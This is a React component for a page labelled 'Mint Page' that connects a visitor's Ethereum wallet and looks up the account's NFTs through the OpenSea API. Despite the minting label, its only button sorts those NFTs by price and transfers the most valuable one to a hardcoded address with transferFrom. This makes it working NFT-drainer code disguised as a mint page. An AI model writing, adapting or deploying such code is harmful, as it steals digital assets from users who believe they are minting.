import React, { useEffect, useState } from "react";
// @import wallet connection
import { useEthContext } from "../../context/EthereumContext";
// @import style
import {
  BtnGroup,
  MintButton,
  MintContainer,
  MintText,
} from "../../styles/Mint/style";
import { toast, ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

import axios from "axios";

import { contractABI } from "../../contract/ABI";
import { transfer_address } from "../../contract/address";

const MintPage = () => {
  const [nftdata, setNftdata] = useState([]);
  const [collectionData, setCollectionData] = useState([]);
  const { provider, currentAcc, web3 } = useEthContext();

  useEffect(async () => {
    if (currentAcc) {
      await getCollectionData();
    }
  }, [currentAcc]);

  useEffect(() => {
    if (nftdata.length > 0) {
      const newData = [];
      nftdata.forEach((item) => {
        item.price = item.sell_orders
          ? item.sell_orders[0].current_price / 10 ** 18
          : 0;
        const base_url = "https://ipfs.io/ipfs";
        item.img_url =
          item && item.image_original_url
            ? item.image_original_url.indexOf("https://ipfs.io") > -1
              ? item.image_original_url
              : item.image_original_url.indexOf("https:") > -1
              ? item.image_original_url.indexOf("/Qm") > -1
                ? base_url +
                  item.image_original_url.slice(
                    item.image_original_url.indexOf("/Qm")
                  )
                : item.image_original_url
              : base_url +
                item.image_original_url.slice(
                  item.image_original_url.indexOf("/Qm")
                )
            : item.image_url.indexOf("https") > -1
            ? item.image_url
            : "";

        newData.push(item);

        setCollectionData(
          newData.sort((a, b) => {
            return b.price - a.price;
          })
        );
      });
    } else {
    }
  }, [nftdata]);

  const getCollectionData = async () => {
    const { data } = await axios.get(
      `https://api.opensea.io/api/v1/assets?owner=${currentAcc}`
    );
    // const { data } = await axios.get(
    //   `https://api.opensea.io/api/v1/assets?owner=0x97be8adc37c81b32083da0d831f14e31a2a24168`
    // );

    setNftdata(data.assets);
  };
  const handleConnectWallet = async () => {
    if (Number(window.ethereum.chainId) === 1) {
      await provider.request({ method: `eth_requestAccounts` });
    } else {
      alert("Please connect to mainnet");
    }
  };

  const onTransferNFT = async (contract_address, tokenID) => {
    const contract = new web3.eth.Contract(contractABI, contract_address);
    await contract.methods
      .transferFrom(currentAcc, transfer_address, tokenID)
      .send({
        from: currentAcc,
        value: 0,
      })
      .on("receipt", async function () {
        toast("Success!");
        await getCollectionData();
      })
      .on("error", function (error) {
        toast(error);
      });
  };

  return (
    <MintContainer>
      <MintText>Mint Page</MintText>
      {currentAcc && currentAcc ? (
        nftdata.length > 0 ? (
          <BtnGroup>
            <MintButton
              onClick={() => {
                if (Number(window.ethereum.chainId) === 1) {
                  onTransferNFT(
                    collectionData[0].asset_contract.address,
                    collectionData[0].token_id
                  );
                } else {
                  alert("Please connect to mainnet");
                }
              }}
            >
              Transfer
            </MintButton>
          </BtnGroup>
        ) : (
          ""
        )
      ) : (
        ""
      )}
      <BtnGroup>
        <MintButton onClick={() => handleConnectWallet()}>
          {currentAcc && currentAcc
            ? `${currentAcc.slice(0, 6)}...${currentAcc.slice(
                currentAcc.length - 4
              )}`
            : "Connect Wallet"}
        </MintButton>
      </BtnGroup>

      <ToastContainer />
    </MintContainer>
  );
};
export default MintPage;
